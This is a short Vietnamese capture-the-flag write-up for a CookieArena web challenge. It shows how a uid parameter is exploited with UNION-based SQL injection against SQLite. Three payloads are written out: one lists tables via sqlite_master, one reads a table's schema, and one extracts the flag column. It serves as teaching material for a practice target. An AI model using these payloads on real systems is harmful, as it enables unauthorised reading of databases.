https://battle.cookiearena.org/challenges/web/baby-address-note

- giao diện web:

![1](./img/17.png)

- Nhập các giá trị uid = 1,2,3,4 được các giá trị sau:

![1](./img/18.png)

-	Tức là chức năng uid có hoạt động giờ ta sẽ chèn kí tự đặc biệt kiểm tra xem web có validate nó ko

![1](./img/19.png)
có validate giữ liệu r

- Dựa vào các giá trị uid =1,2,3,4 ta thấy có 3 cột giá trị trả về là uid, username, address
payload truy vấn để xem cột nào sẽ chứa file flag
    - payload: 1' UNION SELECT 1, name, 3 FROM sqlite_master WHERE type='table'

![1](./img/20.png)
- Có cột tên flag_h7vtt ta cần kiểm tra xem cột này có bao nhiêu cột bằng payload sau:
  - 1' UNION SELECT 1, sql, 3 FROM sqlite_master WHERE name='flag_h7vtt'-- 

- tại sao lại cột 2 có giá trị là sql? Vì cột sql trong sqlite_matster chứa câu lệnh CREAT TABLE giúp ta biết bảng đó có những cột nào!

![1](./img/21.png)

- Có một cột flag duy nhất, giờ ta sẽ lấy flag từ cột đó với payload:
  - 1' UNION SELECT 1,flag, 3 FROM flag_h7vtt-- 

![1](./img/22.png)
lấy được giá trị flag từ bảng flag_h7vt
